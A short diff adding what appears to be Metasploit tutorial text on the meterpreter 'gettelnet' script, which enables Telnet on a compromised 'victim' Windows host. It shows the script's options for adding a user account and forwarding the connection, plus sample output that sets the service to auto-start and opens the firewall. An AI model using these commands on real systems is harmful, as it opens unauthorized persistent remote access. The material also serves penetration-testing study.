@@ -1,0 +1,20 @@
+The gettelnet script is used to enable telnet on the victim if it is disabled.
+
+meterpreter > run gettelnet
+Windows Telnet Server Enabler Meterpreter Script
+Usage: gettelnet -u  -p
+
+OPTIONS:
+
+    -e        Enable Telnet Server only.
+    -f   Forward Telnet Connection.
+    -h        Help menu.
+    -p   The Password of the user to add.
+    -u   The Username of the user to add.
+
+meterpreter > run gettelnet -e
+
+[*] Windows Telnet Server Enabler Meterpreter Script
+[*] Setting Telnet Server Services service startup mode
+[*] The Telnet Server Services service is not set to auto, changing it to auto ...
+[*] Opening port in local firewall if necessary
